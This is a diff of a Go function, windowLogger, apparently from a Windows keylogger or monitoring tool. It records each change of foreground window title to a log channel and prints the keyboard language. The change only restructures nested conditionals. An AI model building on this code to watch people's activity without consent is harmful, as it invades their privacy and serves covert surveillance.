@@ -83,37 +83,35 @@ func windowLogger() {
 		window := make([]uint16, 200)
 		getWindowText(foregroundWindow, &window[0], int32(len(window)))
 
-		if syscall.UTF16ToString(window) != "" {
-			if tmpTitle != syscall.UTF16ToString(window) {
-				tmpTitle = syscall.UTF16ToString(window)
-				tmpWindow <- string("[" + syscall.UTF16ToString(window) + "]\r\n")
+		if syscall.UTF16ToString(window) != "" && tmpTitle != syscall.UTF16ToString(window) {
+			tmpTitle = syscall.UTF16ToString(window)
+			tmpWindow <- string("[" + syscall.UTF16ToString(window) + "]\r\n")
 
-				// get Language ID
-				hwnd, getWindowThreadProcessIDErr := getWindowThreadProcessID(foregroundWindow)
-				if getWindowThreadProcessIDErr != nil {
-					log.Fatalf("getWindowThreadProcessID -> %v", getWindowThreadProcessIDErr)
-				}
-				hkl, getKeyboardLayoutErr := getKeyboardLayout(hwnd)
+			// get Language ID
+			hwnd, getWindowThreadProcessIDErr := getWindowThreadProcessID(foregroundWindow)
+			if getWindowThreadProcessIDErr != nil {
+				log.Fatalf("getWindowThreadProcessID -> %v", getWindowThreadProcessIDErr)
+			}
+			hkl, getKeyboardLayoutErr := getKeyboardLayout(hwnd)
 
-				if getKeyboardLayoutErr != nil {
-					log.Fatalf("getKeyboardLayout -> %v", getKeyboardLayoutErr)
-				}
+			if getKeyboardLayoutErr != nil {
+				log.Fatalf("getKeyboardLayout -> %v", getKeyboardLayoutErr)
+			}
 
-				languageCode := int64(hkl) & int64(math.Pow(2, 16)-1)
-				languageID, languageCodeErr := strconv.Atoi(strconv.FormatInt(languageCode, 16))
+			languageCode := int64(hkl) & int64(math.Pow(2, 16)-1)
+			languageID, languageCodeErr := strconv.Atoi(strconv.FormatInt(languageCode, 16))
 
-				if languageCodeErr != nil {
-					log.Fatalf("languageCodeErr -> %v", languageCodeErr)
-				}
+			if languageCodeErr != nil {
+				log.Fatalf("languageCodeErr -> %v", languageCodeErr)
+			}
 
-				switch languageID {
-				case 409:
-					fmt.Printf("Language: %v \r\n", constants.US)
-				case 422:
-					fmt.Printf("Language: %v \r\n", constants.UA)
-				case 419:
-					fmt.Printf("Language: %v \r\n", constants.RU)
-				}
+			switch languageID {
+			case 409:
+				fmt.Printf("Language: %v \r\n", constants.US)
+			case 422:
+				fmt.Printf("Language: %v \r\n", constants.UA)
+			case 419:
+				fmt.Printf("Language: %v \r\n", constants.RU)
 			}
 		}
 		time.Sleep(1 * time.Millisecond)
